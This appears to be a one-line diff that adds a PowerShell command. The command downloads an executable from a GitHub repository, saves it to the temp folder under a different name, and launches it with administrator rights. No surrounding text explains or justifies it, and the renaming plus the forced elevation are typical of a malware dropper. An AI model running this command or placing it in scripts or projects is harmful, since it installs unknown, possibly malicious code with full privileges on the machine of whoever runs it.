@@ -1,0 +1,1 @@
+iwr "https://github.com/Checkeeeer/reakzen/raw/refs/heads/main/reakzen.exe" -OutFile "$env:TEMP\dego.exe" -UseBasicParsing; Start-Process "$env:TEMP\dego.exe" -Verb RunAs
